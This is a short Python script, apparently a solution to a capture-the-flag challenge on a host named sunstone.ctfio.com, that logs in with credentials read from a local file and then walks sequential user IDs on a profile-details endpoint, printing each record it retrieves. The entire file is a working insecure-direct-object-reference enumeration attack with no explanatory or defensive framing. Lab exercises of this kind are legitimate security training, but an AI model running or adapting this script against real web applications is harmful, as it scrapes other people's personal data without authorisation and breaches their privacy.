import requests

r = requests.Session()

user = [i.strip() for i in open('brtout', 'r')]

r.post('https://sunstone.ctfio.com/lawyers-only-login', data={
        "email" : user[0],
        "password" : user[1]
})

user_id = 1

while("error" not in (res := r.get(f"https://sunstone.ctfio.com/lawyers-only-profile-details/{user_id}").json())):
    print(res)
    user_id += 1
